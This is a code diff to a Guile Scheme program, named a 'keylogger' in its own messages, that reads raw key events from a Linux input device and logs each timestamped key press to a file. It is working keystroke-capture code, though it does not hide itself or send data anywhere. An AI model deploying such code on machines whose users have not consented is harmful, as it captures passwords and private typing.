@@ -3,7 +3,8 @@
  (system foreign)
  (ice-9 binary-ports)
  (rnrs bytevectors)
- (system foreign-object))
+ (system foreign-object)
+ (ev-codes))
 
 ;; Create handler for libinput
 (define libinput (dynamic-link "input.so"))
@@ -16,20 +17,31 @@
 		  '(*))))
     (method (bytevector->pointer bv))))
 
-(call-with-input-file 
-    "/dev/input/event22"
-  (lambda (port)
+(define (main args)
+  (let* ((device-name (car (cdr args)))
+	 (log (open-output-file (car (reverse (cdr args)))))
+	 (kbd (open-input-file device-name #:binary #t)))
+    
+    (format #t "Reading from device ~a\n" device-name)
+    (format log "# time; event; code; key\n")
+
     (let* ((nbytes 24)
 	   (bv (make-bytevector nbytes))
-	   (code 0))
-      (while (not (= 1 code))
-	(get-bytevector-n! port bv 0 nbytes)
-	(set! code (get bv))
+	   (code 0)
+	   (quit #f))
+      
+      (while (not quit)
+	(get-bytevector-n! kbd bv 0 nbytes)
+	(set! code (get bv))	   
 	(when (= 1 (get bv 'value)) ;; key press
-	  (format #t "Keycode: ~a\n" code)
-	  ))))
-
-  #:binary #t)
-
-(format #t "\nFinished kylogger.\n")
-(dynamic-unlink libinput)
+	  (format log "~a;press;~a;~a\n"
+		  (strftime "%c" (localtime (current-time)))
+		  code
+		  (cdr (assq code event-codes))))
+	;; Catch Ctrl+C
+	(sigaction SIGINT
+	  (lambda (x)
+	    (format #t "\nPressed Ctrl+C. Finishing keylogger...\n")
+	    (set! quit #t))))
+      (close kbd)
+      (close log))))
